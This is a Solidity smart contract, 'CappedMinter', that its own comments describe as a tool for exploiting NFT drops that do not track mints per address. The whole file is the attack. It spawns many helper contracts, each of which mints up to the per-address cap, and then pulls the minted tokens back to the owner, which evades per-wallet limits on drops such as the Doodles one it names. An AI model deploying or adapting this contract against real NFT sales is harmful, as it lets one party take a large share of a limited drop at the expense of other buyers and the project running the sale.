// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts/contracts/access/Ownable.sol";
import "openzeppelin-contracts/contracts/token/ERC721/utils/ERC721Holder.sol";
import "./IMintableERC721.sol";
import "./CappedHelper.sol";

/// @title NFT mass minter 
/// @author 0xMouseLess
/// @notice Exploiting NFT drops that don't track number of mints per address
contract CappedMinter is Ownable, ERC721Holder {

    /// @dev NFT mint address
    IMintableERC721 targetNFT;

    /// @dev NFT mint price
    uint128 immutable PRICE_PER_NFT = 0.05 ether;

    /// @dev Max mints per call 
    uint256 immutable MAX_MINT_PER_ADDRESS = 5;

    /// @notice Setting up contract
    /// @param _targetAddress Address of the NFT we want to mint
    constructor(address _targetAddress) Ownable() {
        targetNFT = IMintableERC721(_targetAddress);
    }

    // @notice Repeatedly calls the mint function from the Doodles contract
    // @param numMints The number of times we want to call the mint function  
    function massMint(uint numMints) external payable onlyOwner {
      for(uint i = 0; i < numMints; i++) {
        new CappedHelper{value: PRICE_PER_NFT*MAX_MINT_PER_ADDRESS}(targetNFT);
      }
      // Return if there are any overflow
      payable(owner()).transfer(address(this).balance);
    }

    // @notice Method to transfer minted NFTs to contract owner
    // @param _tokenIds The IDs of the tokens we want to withdraw 
    // @dev This function saves gas and should be called when minting is over and gas is low
    function withdraw(uint[] calldata _tokenIds) external onlyOwner {
      for(uint i=0; i<_tokenIds.length; i++) {
          targetNFT.transferFrom(address(this), owner(), _tokenIds[i]);
      }
    }
}
